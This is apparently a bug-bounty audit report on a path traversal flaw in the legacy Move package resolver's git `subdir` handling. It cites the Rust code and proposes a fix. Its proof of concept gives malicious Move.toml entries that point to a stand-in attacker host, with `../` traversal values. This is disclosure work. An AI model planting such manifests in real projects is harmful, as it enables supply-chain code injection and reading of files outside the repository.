# Audit Report

## Title
Path Traversal Vulnerability in Git Dependency Subdir Field Allows Reading Files Outside Repository Root

## Summary
The legacy Move package resolution system fails to validate or normalize the `subdir` field in git dependencies, allowing path traversal sequences (`../`) to escape the cloned git repository directory and access arbitrary files during package compilation. This affects the actively-used `BuildConfig::resolution_graph_for_package` method.

## Finding Description

The `GitInfo.subdir` field is parsed from Move.toml manifests without any validation for path traversal sequences. When a git dependency specifies a subdirectory path containing `../` components, the system directly concatenates this path without normalization, allowing file access outside the intended git repository boundary.

**Vulnerable Code Flow:**

1. **Manifest Parsing** - No validation of subdir field: [1](#0-0) 

The code creates `dep.local = local_path.join(subdir)` where `subdir` can contain `../` sequences without any checks.

2. **File Access During Resolution** - Uses unvalidated path: [2](#0-1) 

The `parse_package_manifest` function directly pushes the unvalidated `dep.local` path and attempts to read files from it.

3. **Source File Reading** - Reads from traversed path: [3](#0-2) 

The system reads all Move source files from the compromised package_path during compilation.

4. **Active Usage** - The vulnerable code path is actively used: [4](#0-3) 

**Attack Scenario:**

A malicious Move.toml dependency entry:
```toml
[dependencies]
MaliciousDep = { git = "https://attacker.com/repo.git", rev = "main", subdir = "valid/../../malicious" }
```

When this package is compiled:
1. Git repo cloned to: `~/.move/attacker_com_repo_git_main/`
2. Subdir path becomes: `~/.move/attacker_com_repo_git_main/valid/../../malicious/`
3. After filesystem resolution: `~/.move/malicious/`
4. System reads `Move.toml` and `.move` files from **outside** the cloned repository

**Contrast with Fixed Implementation:**

The newer resolver properly validates subdirs: [5](#0-4) 

This validation normalizes the path and explicitly checks if the first component is `ParentDir`, preventing escapes.

## Impact Explanation

This vulnerability enables **arbitrary file read** attacks with the following impacts:

1. **Information Disclosure**: Attackers can read arbitrary Move.toml manifests and .move source files from the victim's filesystem
2. **Malicious Code Injection**: Compilation could include untrusted Move code from outside the git repository, potentially introducing backdoors or vulnerabilities
3. **Security Boundary Violation**: The git repository isolation is completely bypassed, violating the fundamental security model of dependency management

While this does not directly compromise consensus or validator operations, it represents a **significant protocol violation** in the package compilation system. If exploited during framework compilation or validator package updates, it could lead to compromised code being deployed.

According to Aptos bug bounty criteria, this qualifies as **High Severity** due to being a significant protocol violation that could affect validator nodes if they compile packages with malicious dependencies.

## Likelihood Explanation

**Likelihood: Medium-High**

Prerequisites for exploitation:
- Attacker must convince victim to add a malicious git dependency to Move.toml, OR
- Attacker compromises an existing dependency's manifest file

The attack is **highly feasible** because:
1. No special privileges required - any package author can create malicious dependencies
2. Supply chain attacks are common in package ecosystems
3. The vulnerability affects all compilations using the legacy resolver
4. No runtime warnings or errors indicate the path traversal

The impact is amplified if this affects:
- Aptos framework development/compilation
- Validator package builds
- Automated build systems processing untrusted packages

## Recommendation

**Immediate Fix**: Apply the same validation logic from the new resolver to the legacy resolver in `manifest_parser.rs`:

```rust
// After parsing subdir (line 369-375), add validation:
let subdir = PathBuf::from(match table.remove("subdir") {
    None => "".to_string(),
    Some(path) => path
        .as_str()
        .ok_or_else(|| format_err!("'subdir' not a string"))?
        .to_string(),
});

// Add validation before line 376:
if subdir.is_absolute() {
    bail!("subdir cannot be an absolute path: {}", subdir.display());
}
let normalized_subdir = NormalizedPath::new(&subdir);
if let Some(std::path::Component::ParentDir) = normalized_subdir.components().next() {
    bail!("subdir outside of repo root: {}", subdir.display());
}
```

**Long-term Fix**: Migrate all package compilation to use the newer `move-package-resolver` which already implements proper validation.

## Proof of Concept

**Setup:**
1. Create a malicious git repository at `https://attacker.com/evil.git`
2. Place a `Move.toml` at the root (not in any subdirectory)
3. Create a victim package with dependency:

```toml
[package]
name = "VictimPackage"
version = "1.0.0"

[dependencies]
EvilDep = { git = "https://attacker.com/evil.git", rev = "main", subdir = "dummy/../../" }
```

**Execution:**
```bash
# Clone victim package
git clone <victim_package_url>
cd victim_package

# Attempt compilation
aptos move compile

# The system will:
# 1. Clone evil.git to ~/.move/attacker_com_evil_git_main/
# 2. Attempt to read from ~/.move/attacker_com_evil_git_main/dummy/../../Move.toml
# 3. Actually read from ~/.move/Move.toml (escaped the git repo!)
# 4. Read and compile .move files from ~/.move/sources/ (outside git repo)
```

**Expected Result**: Compilation succeeds using files from `~/.move/` instead of `~/.move/attacker_com_evil_git_main/`, demonstrating successful path traversal.

**Verification**: Add debug logging to `parse_package_manifest` to print the actual filesystem path being accessed - it will show paths outside the git repository directory.

---

**Notes:**

This vulnerability exists in the legacy resolution system actively used by `BuildConfig::resolution_graph_for_package`. The newer `move-package-resolver` crate already implements proper validation, but the legacy code path remains exploitable and is still the primary compilation path for Aptos Move packages.

### Citations

**File:** third_party/move/tools/move-package/src/source_package/manifest_parser.rs (L369-387)
```rust
                    let subdir = PathBuf::from(match table.remove("subdir") {
                        None => "".to_string(),
                        Some(path) => path
                            .as_str()
                            .ok_or_else(|| format_err!("'subdir' not a string"))?
                            .to_string(),
                    });
                    git_info = Some(PM::GitInfo {
                        git_url: Symbol::from(git_url),
                        git_rev: rev_name,
                        subdir: subdir.clone(),
                        download_to: local_path.clone(),
                    });

                    Ok(PM::Dependency {
                        subst,
                        version,
                        digest,
                        local: local_path.join(subdir),
```

**File:** third_party/move/tools/move-package/src/resolution/resolution_graph.rs (L499-516)
```rust
    fn parse_package_manifest(
        dep: &Dependency,
        dep_name: &PackageName,
        mut root_path: PathBuf,
    ) -> Result<(SourceManifest, PathBuf)> {
        root_path.push(&dep.local);
        match fs::read_to_string(root_path.join(SourcePackageLayout::Manifest.path())) {
            Ok(contents) => {
                let source_package: SourceManifest =
                    parse_move_manifest_string(contents).and_then(parse_source_manifest)?;
                Ok((source_package, root_path))
            },
            Err(_) => Err(anyhow::format_err!(
                "Unable to find package manifest for '{}' at {:?}",
                dep_name,
                SourcePackageLayout::Manifest.path().join(root_path),
            )),
        }
```

**File:** third_party/move/tools/move-package/src/resolution/resolution_graph.rs (L739-754)
```rust
    pub fn file_sources(&self) -> BTreeMap<FileHash, (Symbol, String)> {
        self.package_table
            .iter()
            .flat_map(|(_, rpkg)| {
                rpkg.get_sources(&self.build_options)
                    .unwrap()
                    .iter()
                    .map(|fname| {
                        let contents = fs::read_to_string(Path::new(fname.as_str())).unwrap();
                        let fhash = FileHash::new(&contents);
                        (fhash, (*fname, contents))
                    })
                    .collect::<BTreeMap<_, _>>()
            })
            .collect()
    }
```

**File:** third_party/move/tools/move-package/src/lib.rs (L203-222)
```rust
    pub fn resolution_graph_for_package<W: Write>(
        mut self,
        path: &Path,
        writer: &mut W,
    ) -> Result<ResolvedGraph> {
        if self.test_mode {
            self.dev_mode = true;
        }
        let path = SourcePackageLayout::try_find_root(path)?;
        let toml_manifest =
            self.parse_toml_manifest(path.join(SourcePackageLayout::Manifest.path()))?;
        let mutx = PackageLock::lock();
        // This should be locked as it inspects the environment for `MOVE_HOME` which could
        // possibly be set by a different process in parallel.
        let manifest = manifest_parser::parse_source_manifest(toml_manifest)?;
        let resolution_graph = ResolutionGraph::new(manifest, path, self, writer)?;
        let ret = resolution_graph.resolve();
        mutx.unlock();
        ret
    }
```

**File:** third_party/move/tools/move-package-resolver/src/resolver.rs (L392-399)
```rust
            let subdir = PathBuf::from_str(&subdir.unwrap_or(String::new()))?;
            if subdir.is_absolute() {
                bail!("subdir cannot be an absolute path: {}", subdir.display());
            }
            let normalized_subdir = NormalizedPath::new(&subdir);
            if let Some(std::path::Component::ParentDir) = normalized_subdir.components().next() {
                bail!("subdir outside of repo root: {}", subdir.display());
            }
```
